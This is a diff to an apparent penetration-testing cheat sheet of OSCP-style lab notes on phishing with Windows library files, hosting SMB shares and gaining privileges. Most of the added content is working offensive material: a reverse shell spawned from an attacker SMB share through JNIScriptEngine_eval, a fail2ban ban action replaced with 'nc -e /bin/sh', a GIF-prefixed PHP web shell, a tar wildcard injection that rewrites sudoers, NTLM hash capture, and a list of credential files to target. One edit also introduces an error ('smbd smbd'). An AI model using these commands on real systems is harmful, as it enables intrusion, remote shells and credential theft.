@@ -120,7 +120,7 @@ python -m SimpleHTTPServer 80
 Great tool of cheat sheets: `https://pentestmonkey.net/cheat-sheet/shells/reverse-cheat-sheet`
 
 
-### Abusing Windows Library Files
+### Phishing with Windows Library Files
 
 Windows library files are virtual containers for user content. They connect users with data stored in remote locations like web services or shares. These files have a .Library-ms file extension and can be executed by double-clicking them in Windows Explorer.
 
@@ -137,22 +137,15 @@ kali@kali:~$ touch /home/kali/webdav/test.txt
 
 kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 Running without configuration file.
-17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
-17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
-17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
-17:41:53.919 - INFO    : Property manager:  None
-17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
-17:41:53.919 - INFO    : Registered DAV providers by route:
-17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
-17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
-17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
-17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
-17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
-17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
+...
 17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
 ```
 
 You can check that it's running by going to 'http://127.0.0.1' in your browser.
+
+```bash
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
 
 #### Find Files Owned by Particular User (or Group)
 
@@ -399,9 +392,6 @@ Try to set up a quick python server and make a get request with HTML:
 
 "https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/" 
 
-#### Alternatives for id_rsa
-
-".ssh/id_dsa, .ssh/id_ecdsa, .ssh/id_ed25519, .ssh/authorized_keys"
 
 #### Acessing Loopback Interface
 
@@ -418,6 +408,8 @@ This didn't work without the '@' in front of the attachment.
 
 ```bash
 sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.196.189 --body body.txt --header "Subject: Staging Script" -ap
+
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
  ```
 
 #### Transfer Files with NetCat
@@ -446,37 +438,44 @@ sudo apt update                            sudo apt install samba
 ```
 
 2. Configure Samba:
-    • Edit the Samba configuration file:
-       sudo nano /etc/samba/smb.conf
 
-    • Add your share definition at the end of the file. For example:        
+Edit the Samba configuration file:
 
 ```bash
-       [MyShare]
-       path = /path/to/your/share
-       available = yes
-       valid users = your_username
-       read only = no
-       browsable = yes              
-       public = yes
-       writable = yes
+sudo nano /etc/samba/smb.conf
 ```
 
-   3 Add a Samba User:
-    • Samba requires a Linux user to map to. If you haven't already, create a Linux user or use an   
-      existing one.
-    • Then, add the user to Samba:
+Add your share definition at the end of the file. For example:        
+
+```bash
+[MyShare]
+path = /path/to/your/share
+available = yes
+valid users = your_username
+read only = no
+browsable = yes              
+public = yes
+writable = yes
+```
+
+3. Add a Samba User:
+
+Samba requires a Linux user to map to. If you haven't already, create a Linux user or use an existing one.
+Then, add the user to Samba:
 
 ```bash
 sudo smbpasswd -a your_username
-sudo systemctl restart smbd nmbd
+sudo systemctl restart smbd smbd
 ```
 
 4.  Verify the Share:
-     • From a Windows machine, you can access the share using "\\kali_ip\MyShare".
-    • From a Linux machine, use smbclient
-    "//kali_ip/MyShare -U your_username" to access the share.
 
+From a Windows machine, you can access the share using "\\kali_ip\MyShare".
+From a Linux machine, use smbclient to access the share.
+
+```bash
+    "//kali_ip/MyShare -U your_username" 
+```
 Alternative:
 
 Kali:
@@ -488,8 +487,24 @@ impacket-smbserver -smb2support newShare . -username test -password test
 Windows:
 
 ```bash
-PS C:\Users\jim\Documents> net use z: \\192.168.45.231\newShare /u:test test
+PS C:\Users\jim\Documents> net use z: \\192.168.45.163\newShare /u:test test
 PS C:\Users\jim\Documents> copy Database.kdbx z:\
+```
+
+You can also execute commands that lie on your Linux machine from a Windows one through SMB shares:
+
+```bash
+sudo smbserver.py -smb2support Share .
+
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/nc.exe -e cmd.exe 192.168.45.163 8082").getInputStream()).useDelimiter("\\Z").next()');
+#or 
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.45.163/Share/wicked.exe").getInputStream()).useDelimiter("\\Z").next()');
+```
+
+#### Host Simple FTP Server
+
+```bash
+python -m pyftpdlib -w
 ```
 
 #### Host an Apache Web Server
@@ -548,6 +563,18 @@ cat key.pub > ../../../../../../../../../../root/.ssh/authorized_keys
 ssh -i key root@<ip address>
 ```
 
+```bash
+#### Upload SSH Key Properly
+
+```bash
+ssh-keygen -t rsa
+chmod 600 file
+chmod 666 file.pub
+mv file.pub authorized_keys
+# Copy the contents of (authorized_keys) file.pub to their authorized_keys file
+ssh -i file user@host
+```
+
 #### Exposed Git Repo from URL
 
 ```bash
@@ -559,6 +586,7 @@ python3 /opt/git-dumper/git_dumper.py http://192.168.211.144/.git .
 Then, do:
 
 ```bash
+git log
 git show <each commit>
 ```
 
@@ -576,4 +604,174 @@ You can easily download files from the windows machine to your kali vm using:
 
 ```bash
 download <remote file path> <local file path>
+```
+
+#### Name Mash
+
+If you have first and last names, you can use this program to create different popular formats for usernames, "https://gist.github.com/superkojiman/11076951".
+
+
+#### Uploading "GIF"
+
+If you have the "GIF89a;" at the beginning, you may be able to bypass blacklists.
+
+```bash
+GIF89a;
+<?php system($_GET["cmd"]); ?
+```
+
+#### Getting a Reverse Shell from SMB (Windows)
+
+You can create a .lnk file with hashgrab.py and impacket's smb server:
+
+```bash
+python3 /opt/hashgrab.py 192.168.45.163 test
+sudo responder -I tun0
+# or impacket-smbserver share share -smb2support
+smbclient \\\\$ip\\nara
+put test.lnk
+# look for hashes in smb server
+```
+
+#### Add a Comproised User to Remote Access through LDAP
+
+```bash
+ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
+
+evil-winrm -u tracy.white -i nara.nara-security.com
+```
+
+#### Split Strings in Bash
+
+```bash
+# Splits on each ':' and grabs the 3rd index (for each line)
+awk -F: '{ print $4 }' ntds.hashes
+```
+
+#### Auth through nc bind
+
+If you bind to a port, such as Cassandra on port 8021, and you get the following,
+
+```bash
+kali@kali:~$ nc 192.168.120.155 8021
+Content-Type: auth/request
+...
+help
+
+Content-Type: command/reply
+Reply-Text: -ERR command not found
+...
+```
+
+you can authenticate by typing:
+
+```bash
+auth <default password>
+```
+
+
+#### Modifying Parameters for Login Portals , BurpSuite
+
+Take the time to review any account login information in BurpSuite. Look at the response.. in the scenario that you're creating a new account and there's an email verification, is there a parameter "confirmed" that decides if it recognizes you? Hijack the email parameter:
+
+```bash
+// Before
+_method=patch&authenticity_token=sqroxonHHHMVjShpvoFQxdQaO5lP9Z-w_XCLkSzgHY9UDTziioXABz5UKg8E0pO7qUVlzkDlK6WfwSjluHnkMQ&user%5Bemail%5D=test2%40test.test&commit=Change%20email
+
+//After
+_method=patch&authenticity_token=RSv5NyN2tJJgQcgbwtyWzA7oHYcTW4dSZNsLoHuASc-jjC0TIDRo5kuYyn14j1Wyc7dD0BxLM0cGaqjU7xmwcQ&user%5Bconfirmed%5D=True&commit=Change%20email
+```
+
+#### Interesting Files for File Inclusion, Path Traversal
+
+```bash
+/etc/passwd
+/etc/shadow
+/root/.ssh/id_rsa
+/root/.ssh/id_ecdsa
+/root/.ssh/id_ed25519
+/home/user/.ssh/id_rsa
+/home/user/.ssh/id_ecdsa
+/hom/user/.ssh/id_ed25519
+/proc/self/environ
+/proc/self/cmdline
+/var/www/html/index.php # Or any interesting files you didn't have access to with gobuster
+/home/user/.bash_history
+/root/.bash_history
+/etc/ssh/sshd_config # See who's allowed to ssh into the box
+```
+
+#### Fail2Ban
+
+If you're a part of the fail2ban group, check out the main configuration file which can be found at /etc/fail2ban/jail.conf. Look for how to get banned, as well as what the ban action is. If you can modify the ban file or action directly, you can make it give you a reverse shell onto the box as root.
+
+```bash
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+actionban = /usr/bin/nc 192.168.45.163 873 -e /bin/sh
+```
+
+#### Stop a Backgrounded Process
+
+```bash
+ps -eaf | grep pspy
+kill 1713
+# or
+jobs
+kill %1
+# or
+fg %1 # then Ctrl+C
+```
+
+#### ODT Files to Capture NTLM Hash
+
+If you can upload ODT files to a Windows backend, consider making an ODT file that reaches out to your server that is listening for hashes. You can do this easily with 44564 on ExploitDB.
+
+#### Wildcard Cronjobs
+
+If you see a cronjob with a wildcard, you may need to get creative for privescs. Use GTFOBins for inspiration, and just Google around if you're stuck. In this case, the cronjob was
+
+```bash
+cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
+```
+
+In order to append an abuse command to the end of the cronjob, this is what I did:
+
+```bash
+echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "" > "--checkpoint-action=exec=sh privesc.sh"
+echo "" > --checkpoint=1
+```
+
+#### Remove Duplicated Words
+
+Assuming that the words are one per line, and the file is already sorted:
+
+```bash
+uniq filename
+```
+
+If the file's not sorted:
+
+```bash
+sort filename | uniq
+```
+
+If they're not one per line, and you don't mind them being one per line:
+
+```bash
+tr -s [:space:] \\n < filename | sort | uniq
+```
+
+That doesn't remove punctuation, though, so maybe you want:
+
+```bash
+tr -s [:space:][:punct:] \\n < filename | sort | uniq
+```
+
+#### SNMPWalk
+
+Always run this is snmp is open:
+
+```bash
+snmpwalk -v 2 -c public $ip NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
